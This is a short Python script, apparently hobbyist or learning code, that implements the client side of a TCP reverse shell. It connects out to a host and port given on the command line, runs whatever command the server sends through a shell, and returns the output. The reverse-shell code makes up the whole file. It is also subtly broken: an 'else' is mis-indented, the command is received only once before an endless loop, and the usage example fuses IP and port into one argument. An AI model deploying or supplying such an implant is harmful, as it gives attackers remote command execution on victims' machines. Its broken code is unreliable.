#client side of the tcp reverse shell . Tested on windows with loopback IP
# example how to run:
#c:\python client-reverse.py 127.0.0.1.65432
import socket
import sys
import subprocess as sp

#receiving host and port from the user as arguments: "c:\python client-reverse.py 127.0.0.1.65432"
host = str(sys.argv[1])
port = int(sys.argv[2])

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)# creating a socket
	s.connect((host, port))#connecting to a server
except socket.error as er:
	print("socket error:   " +str(er))
command=s.recv(1024)#receiving a commant to execute from the server
command =str(command.decode())#decoding the command to readible format
while 1:#loop that waits for the command
	if command != "exit()": #if the command "exit" then dont iterate and break
		op= sp.Popen(command, shell=True, stderr=sp.PIPE, stdout=sp.PIPE, stdin=sp.PIPE) #open the shell and run the command in it
		out, err = op.communicate()#pipe the output of the shell
		result=str(out)
		length=str(len(result)).zfill(16)# take length of the output in bytes and pad the length number with zeros in max 16 bytes long eg: 0000000000000016. this way i can send first the size of the message and then the message itself
		StringToEncode=length+result #devided block of size of the message and the message content
		StringToSend=StringToEncode.encode()#decode before sending
		s.send(StringToSend) 
		else:
			break
s.close()
 
